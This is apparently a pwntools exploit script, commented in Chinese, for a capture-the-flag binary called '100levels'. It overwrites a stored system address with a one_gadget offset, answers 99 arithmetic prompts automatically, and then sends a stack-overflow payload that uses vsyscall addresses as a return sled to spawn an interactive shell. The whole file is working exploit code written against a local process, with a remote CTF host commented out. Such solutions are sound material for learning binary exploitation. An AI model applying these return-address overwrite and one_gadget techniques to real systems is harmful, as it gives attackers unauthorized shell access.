#!/usr/bin/env python
# -*- coding:utf-8 -*-
from pwn import *
context.log_level = 'debug' 
context.terminal = ['tmux', 'splitw', '-h']
#io = remote('111.198.29.45', 45697)
io=process("./100levels")
libc = ELF('./libc.so.6')

one_gadget = 0x4f322
#system_offset = 0x45390
system_offset = libc.sym['system']
#ret_addr = 0xffffffffff600000#vsyscall，当滑板用
ret_addr = 0xffffffffff600000

io.sendlineafter("Choice:\n", '2')#将system函数地址写入var_100处
io.sendlineafter("Choice:\n", '1')#进入go函数
io.sendlineafter("levels?\n", str(0))#防止system值被改写
io.sendlineafter("more?\n", str(one_gadget - system_offset))
#将var_100处的system地址改写为one_gadget的地址

#递归调用了99次，所以要回答99次问题
for i in range(99):
    io.recvuntil("Question: ")
    a = int(io.recvuntil(" ")[:-1])
    io.recvuntil("* ")
    b = int(io.recvuntil(" ")[:-1])
    io.sendlineafter("Answer:", str(a * b))
    #最后一次，控制ret返回到one_gadget
payload  = 'A' * 0x30   # buffer
payload += 'B' * 0x8    # rbp
payload += p64(ret_addr) * 3
    
    #栈调用结构来看，需要三个滑板
gdb.attach(io, 'b *0x555555554f46\nb *0x00007ffff7a33322\nc')
io.sendafter("Answer:", payload) 
io.interactive()
